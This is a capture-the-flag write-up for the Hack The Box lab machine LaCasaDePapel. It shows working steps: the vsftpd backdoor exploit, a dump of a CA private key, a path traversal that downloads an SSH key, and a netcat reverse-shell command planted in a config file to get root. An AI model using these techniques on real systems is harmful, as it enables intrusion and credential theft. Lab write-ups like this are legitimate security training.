---
layout: post
title: Hack The Box - LaCasaDePapel
categories: hack-the-box
tags: [linux, web, ssh, php]
description: My write-up for LaCasaDePapel from Hack The Box.
image: /hackthebox/lacasadepapel/0.png
---

<hr>
## Quick Summary
<br> Hey guys today LaCasaDePapel retired and here's my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It's a Linux box and its ip is `10.10.10.131`, I added it to `/etc/hosts` as `lacasadepapel.htb`. Let's jump right in !
![](/images/hackthebox/lacasadepapel/0.png)
<hr>
## Nmap
<br> As always we will start with `nmap` to scan for open ports and services :
`nmap -sV -sT -sC lacasadepapel.htb`
![](/images/hackthebox/lacasadepapel/1.png)
<br> We have `http` on port 80. `https` on port 443, `ftp` on port 21 and `ssh` on port 22.
<br> Anonymous authentication wasn't allowed on `ftp` so I checked `http` and `https` :
```
root@kali:~/Desktop/HTB/boxes/lacasadepapel# ftp lacasadepapel.htb
Connected to lacasadepapel.htb.
220 (vsFTPd 2.3.4)
Name (lacasadepapel.htb:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
```
<br>
<hr>
## HTTP
`http://lacasadepapel.htb`
![](/images/hackthebox/lacasadepapel/2.png)
<br> We see an image of the characters from [LaCasaDePapel](https://www.imdb.com/title/tt6468322/) (TV show) and a QR code for `OTP`, I scanned it with [Google Authenticator](https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&hl=en) on my phone :
![](/images/hackthebox/lacasadepapel/3.png)
<br> As you can see I had to refresh it manually while other tokens refreshed automatically, no idea why but anyway I took the `OTP` and used `test@test.com` as email :
![](/images/hackthebox/lacasadepapel/4.png)
<br> Then nothing happened, I just got the same page back again. I tried `gobuster` to see if I can find any sub directories and I didn't get anything useful. Let's check `https`.
`https://lacasadepapel.htb`
![](/images/hackthebox/lacasadepapel/5.png)
<br> The same background with an error message saying : "Sorry, but you need to provide a client certificate to continue."
<br>
<hr>
## vsftpd 2.3.4, Psy Shell
<br> After hitting dead ends with web, I checked the `ftp` service again, the version was `vsftpd 2.3.4` (from the `nmap` scan) so I searched for exploits :
```
root@kali:~/Desktop/HTB/boxes/lacasadepapel# searchsploit vsftpd 2.3.4
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                            |  Path
                                                                                                                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                    | exploits/unix/remote/17491.rb
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
<br> Command Execution and there is a `metasploit` module for it, but the exploit didn't work :
```
msf5 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   1  auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials
   2  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
   3  exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   4  exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.131
rhosts => 10.10.10.131
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit 

[*] 10.10.10.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.131:21 - USER: 331 Please specify the password.
[+] 10.10.10.131:21 - Backdoor service has been spawned, handling...
[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell
[*] Exploit completed, but no session was created.
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > 
```
<br> Apparently there was another service running on port 6200, a quick `nmap` scan shows that the port is open :
![](/images/hackthebox/lacasadepapel/6.png)
<br> So I connected to that port with `nc` to see what's there :
```
root@kali:~/Desktop/HTB/boxes/lacasadepapel# nc lacasadepapel.htb 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
```
<br> The banner says `Psy Shell v0.9.9`, I didn't know what `Psy Shell` was but a quick search and I found the [website](https://psysh.org/). It's a shell used for interactive `php` debugging and we can use it to execute `php`. 
<br> I tried to execute system commands but I couldn't :
```
exec("whoami")
PHP Fatal error:  Call to undefined function exec() in Psy Shell code on line 1
system("whoami")
PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1
```
<br> I tried to use `scandir()` to see the current directory listing and it worked :
```
scandir(".")
=> [
	 ".",
	 "..",
	 ".DS_Store",
	 "._.DS_Store",
	 "bin",
	 "boot",
	 "dev",
	 "etc",
	 "home",
	 "lib",
	 "lost+found",
	 "media",
	 "mnt",
	 "opt",
	 "proc",
	 "root",
	 "run",
	 "sbin",
	 "srv",
	 "swap",
	 "sys",
	 "tmp",
	 "usr",
	 "var",                           
   ]
```
<br> I could list the directories in `/home` :
```
scandir("home/")
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
```
<br> Now we know the users on the box : `berlin`,`dali`,`nairobi`,`oslo` and `professor`.
<br> I found the user flag in `/home/berlin`, however I got permission denied when I tried to read it :
```
scandir("home/berlin")
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]
readfile("home/berlin/user.txt")
PHP Warning:  readfile(home/berlin/user.txt): failed to open stream: Permission denied in phar://eval()'d code on line 1
```
<br> Same for `.ssh`, after a lot of failed attempts to get `RCE`, I looked at the `help` menu to see if there's anything helpful:
```
help
  help       Show a list of commands. Type `help [foo]` for information about [foo].                                Aliases: ?  
  ls         List local, instance or class variables, methods and constants.                                        Aliases: list, dir
  dump       Dump an object or primitive.
  doc        Read the documentation for an object, class, constant, method or property.                             Aliases: rtfm, man  
  show       Show the code for an object, class, constant, method or property.
  wtf        Show the backtrace of the most recent exception.                                                       Aliases: last-exception, wtf?
  whereami   Show where you are in the code.
  throw-up   Throw an exception or error out of the Psy Shell.
  timeit     Profiles with a timer.
  trace      Show the current call stack.
  buffer     Show (or clear) the contents of the code input buffer.                                                 Aliases: buf
  clear      Clear the Psy Shell screen.
  edit       Open an external editor. Afterwards, get produced code in input buffer.
  sudo       Evaluate PHP code, bypassing visibility restrictions.
  history    Show the Psy Shell history.                                                                            Aliases: hist
  exit       End the current session and return to caller.                                                          Aliases: quit, q
```
<br> I used `ls` to see what variables are there :
```
ls
Variables: $tokyo
```
<br> There was only one variable called `tokyo` , let's check that variable:
```
show $tokyo
  > 2| class Tokyo {
    3|  private function sign($caCert,$userCsr) {
    4|          $caKey = file_get_contents('/home/nairobi/ca.key');
    5|          $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
    6|          openssl_x509_export($userCert, $userCertOut);
    7|          return $userCertOut;
    8|  }
    9| }
```
<br> The function `sign()` is using the private key `/home/nairobi/ca.key`, we can grab that key and create a client certificate to access the `https` service we couldn't access before. 
```
file_get_contents('/home/nairobi/ca.key');
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   """
```
<br>
<hr>
## Client Certificate Generation
<br> First, we will create a certificate signing request (`CSR`) :
```
root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# cat ca.key
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----
root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl req -new -key ca.key -out server.csr                                                                                                                    
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```
<br> Then we will use it to generate the certificate :
```
root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt                                                                                      
Signature ok
subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, CN = lacasadepapel.htb
Getting Private key
```
<br> And finally we will create a `PKCS12` certificate :
```
root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12
Enter Export Password:
Verifying - Enter Export Password:
root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# 
```
<br> Now we can import it to Firefox :
![](/images/hackthebox/lacasadepapel/7.png)
<br>
<br>
![](/images/hackthebox/lacasadepapel/8.png)
<br>
<br>
![](/images/hackthebox/lacasadepapel/9.png)
<br> We have to Remove the `ssl` exception we gave earlier to `https://lacasadepapel.htb`, then we will visit it again and it will request our client certificate :
![](/images/hackthebox/lacasadepapel/10.png)
<br>
<br>
![](/images/hackthebox/lacasadepapel/11.png)
<hr>
## Path Traversal, Arbitrary File Download, User Flag
<br> After gaining access we have an option to choose season 1 or season 2, clicking on one of them will take us to a page to download episodes :
![](/images/hackthebox/lacasadepapel/12.png)
<br> As you can see in the `url` there is a get parameter called `path`, which means that the `php` script reads files from a given path and lists them (in this case directory : `SEASON-1`). If that parameter doesn't get filtered correctly it can cause a path traversal vulnerability allowing us to list files in other directories. However listing files doesn't help us in any way, we already can do that with `Psy Shell`. But if we try to download an episode, `01.avi` for example :
![](/images/hackthebox/lacasadepapel/13.png) 
<br> The download link will be : `https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp`
<br> Decoding that base-64 string we get this :
```
root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo U0VBU09OLTEvMDEuYXZp | base64 -d 
SEASON-1/01.aviroot@kali:~/Desktop/HTB/boxes/lacasadepapel# 
```
<br> It uses the path to request files, let's see where are we first :
`https://lacasadepapel/?path=../`
![](/images/hackthebox/lacasadepapel/14.png)
<br> We are in `berlin`'s home directory (Because the user flag is there).
`https://lacasadepapel/?path=../.ssh/`
![](/images/hackthebox/lacasadepapel/15.png)
<br> Let's download `id_rsa`, we know that the path is `../.ssh/id_rsa` :
```
root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo -n "../.ssh/id_rsa" | base64
Li4vLnNzaC9pZF9yc2E=
root@kali:~/Desktop/HTB/boxes/lacasadepapel# 
```
<br> `-n` for no new lines.
`https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=`
![](/images/hackthebox/lacasadepapel/16.png)
<br> We found the key in `berlin`'s home directory, however I couldn't get `ssh` as `berlin`, I tried other users and `professor` worked :
![](/images/hackthebox/lacasadepapel/17.png)
<br> I couldn't read the flag as `professor`, so I downloaded it like I downloaded the `ssh` key :
```
root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo -n "../user.txt" | base64
Li4vdXNlci50eHQ=
root@kali:~/Desktop/HTB/boxes/lacasadepapel# 
```
`https://lacasadepapel.htb/file/Li4vdXNlci50eHQ=`
![](/images/hackthebox/lacasadepapel/18.png)
<br>
<br>
![](/images/hackthebox/lacasadepapel/19.png)
<br> We owned user.
<hr>
## Privilege Escalation, Root Flag
<br> In the home directory of `professor` there are 2 interesting files : `memcached.ini` and `memcached.js` :
```
lacasadepapel [~]$ ls -la
total 24
drwxr-sr-x    4 professo professo      4096 Mar  6 20:56 .
drwxr-xr-x    7 root     root          4096 Feb 16 18:06 ..
lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -> /dev/null
drwx------    2 professo professo      4096 Jan 31 21:36 .ssh
-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29 01:24 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29 01:31 node_modules
lacasadepapel [~]$ 
```
<br> We can't read `memcached.js` but we can read `memecached.ini`, we can't write to both. 
```
lacasadepapel [~]$ cat memcached.js 
cat: can't open 'memcached.js': Permission denied
lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
lacasadepapel [~]$ 
```
<br> `memcached.ini` is executing this command : `/usr/bin/node /home/professor/memcached.js` as `nobody` by using `sudo`. Most likely it will be running as root, I ran `pspy` and saw that the command gets executed periodically :
![](/images/hackthebox/lacasadepapel/20.png)
<br> The `uid` is 65534 which is the `uid` of `nobody` :
```
lacasadepapel [~]$ id nobody
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
lacasadepapel [~]$ 
```
<br> We can't write to `memcached.ini`, but we can delete it and create a new one :
```
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
lacasadepapel [~]$ rm memcached.ini
rm: remove 'memcached.ini'? y
lacasadepapel [~]$ vi memcached.ini
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = /usr/bin/nc 10.10.xx.xx 1337 -e /bin/bash
lacasadepapel [~]$
```
<br> I changed the command from `sudo -u nobody /usr/bin/node /home/professor/memcached.js` to `/usr/bin/nc 10.10.xx.xx 1337 -e /bin/bash`. After some seconds I got a reverse shell as root :
![](/images/hackthebox/lacasadepapel/21.png)
<br> And we owned root !
<br> That's it , Feedback is appreciated !
<br> Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
<br> Thanks for reading.
<br>
<br>
<br> Previous Hack The Box write-up : [Hack The Box - CTF](/hack-the-box/ctf/)
<br> Next Hack The Box write-up : [Hack The Box - Fortune](/hack-the-box/fortune/)
<hr>